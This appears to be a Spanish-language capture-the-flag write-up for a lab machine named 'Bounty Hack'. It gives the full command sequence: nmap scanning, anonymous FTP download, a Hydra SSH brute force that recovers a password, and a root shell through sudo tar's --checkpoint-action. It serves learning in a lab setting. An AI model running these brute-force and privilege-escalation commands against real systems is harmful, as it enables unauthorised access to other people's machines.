+++
title = "Bounty Hack"
author = ["aisak"]
date = 2026-01-02
draft = false
+++

<div class="ox-hugo-toc toc">

<div class="heading">Table of Contents</div>

- [Enumeration](#enumeration)
    - [Host Availability (ICMP)](#host-availability--icmp)
    - [Full TCP Port Scan](#full-tcp-port-scan)
    - [Web Enumeration (HTTP - Port 80)](#web-enumeration--http-port-80)
    - [Enumeración Básica del Sitio Web](#enumeración-básica-del-sitio-web)
    - [FTP Enumeration (Anonymous Access)](#ftp-enumeration--anonymous-access)
    - [Listing de Archivos en FTP](#listing-de-archivos-en-ftp)
    - [Descarga de Archivos desde FTP](#descarga-de-archivos-desde-ftp)
    - [Observaciones](#observaciones)
    - [Credential Brute Force (SSH)](#credential-brute-force--ssh)
    - [Credenciales Válidas Encontradas](#credenciales-válidas-encontradas)
- [Initial Access (SSH)](#initial-access--ssh)
- [User Flag](#user-flag)
- [Privilege Escalation](#privilege-escalation)
    - [Sudo Enumeration](#sudo-enumeration)
    - [Escalada de Privilegios mediante tar](#escalada-de-privilegios-mediante-tar)
- [Root Flag](#root-flag)

</div>
<!--endtoc-->



## Enumeration {#enumeration}


### Host Availability (ICMP) {#host-availability--icmp}

Se verifica conectividad con la máquina objetivo mediante ICMP.

```bash
ping 10.66.190.139
```

La máquina responde correctamente a ICMP, confirmando que se encuentra activa.

---


### Full TCP Port Scan {#full-tcp-port-scan}

Se realiza un escaneo completo de puertos TCP utilizando SYN scan, deshabilitando resolución DNS y host discovery.

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.66.190.139
```

Puertos TCP abiertos identificados:

-   FTP (21)
-   SSH (22)
-   HTTP (80)


### Web Enumeration (HTTP - Port 80) {#web-enumeration--http-port-80}

Se accede al servicio web expuesto en el puerto 80 para identificar posibles vectores de ataque adicionales.

```nil
http://10.66.190.139
```

El sitio web presenta una página simple sin funcionalidades interactivas, formularios ni contenido sensible visible.

---


### Enumeración Básica del Sitio Web {#enumeración-básica-del-sitio-web}

Se revisa manualmente el contenido y estructura del sitio, sin encontrar:

-   Directorios ocultos relevantes
-   Formularios de autenticación
-   Comentarios en el código fuente
-   Información sensible o credenciales expuestas

No se identifican vectores de ataque aprovechables a través del servicio HTTP.


### FTP Enumeration (Anonymous Access) {#ftp-enumeration--anonymous-access}

Se realiza conexión al servicio FTP identificado en el puerto 21 utilizando credenciales anónimas.

```bash
ftp 10.66.190.139
```

El servidor FTP permite acceso anónimo, lo que representa un vector claro de enumeración.

---


### Listing de Archivos en FTP {#listing-de-archivos-en-ftp}

```nil
ftp> ls -al
```

Se identifican dos archivos accesibles para lectura:

-   \`locks.txt\`
-   \`task.txt\`

---


### Descarga de Archivos desde FTP {#descarga-de-archivos-desde-ftp}

```nil
ftp> get locks.txt
ftp> get task.txt
```

Los archivos son descargados exitosamente al sistema local para su posterior análisis.

---


### Observaciones {#observaciones}

-   El servicio utiliza ****vsFTPd 3.0.5****
-   El acceso anónimo está habilitado
-   Existen archivos legibles en el directorio raíz del FTP
-   Posible uso de \`locks.txt\` como ****wordlist**** o pista para acceso posterior


### Credential Brute Force (SSH) {#credential-brute-force--ssh}

A partir de los archivos obtenidos mediante FTP, se identifica el usuario objetivo y una posible lista de contraseñas.
Se realiza un ataque de fuerza bruta contra el servicio SSH utilizando Hydra.

```bash
hydra -l lin -P locks.txt ssh://10.66.190.139
```

---


### Credenciales Válidas Encontradas {#credenciales-válidas-encontradas}

Las credenciales obtenidas permiten acceso SSH al sistema objetivo:

-   Usuario: \`lin\`
-   Contraseña: \`RedDr4gonSynd1cat3\`

Este acceso representa el ****Initial Foothold**** en el sistema.


## Initial Access (SSH) {#initial-access--ssh}

Se accede al sistema utilizando las credenciales obtenidas mediante fuerza bruta.

```bash
ssh lin@10.66.190.139
```

---


## User Flag {#user-flag}

Una vez dentro del sistema, se enumeran los archivos del escritorio del usuario.

```bash
ls -la ~/Desktop
```

Se obtiene la bandera de usuario:

```bash
cat user.txt
```

---


## Privilege Escalation {#privilege-escalation}


### Sudo Enumeration {#sudo-enumeration}

Se enumeran los privilegios sudo del usuario \`lin\`.

```bash
sudo -l
```

El usuario puede ejecutar el binario \`tar\` como root, lo cual permite ejecución de comandos arbitrarios.

---


### Escalada de Privilegios mediante tar {#escalada-de-privilegios-mediante-tar}

Se abusa de la funcionalidad \`--checkpoint-action\` de \`tar\` para ejecutar una shell como root.

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

Se confirma la escalada de privilegios:

```bash
whoami
```

---


## Root Flag {#root-flag}

Con acceso root, se obtiene la bandera final.

```bash
cat /root/root.txt
```

PWNED!
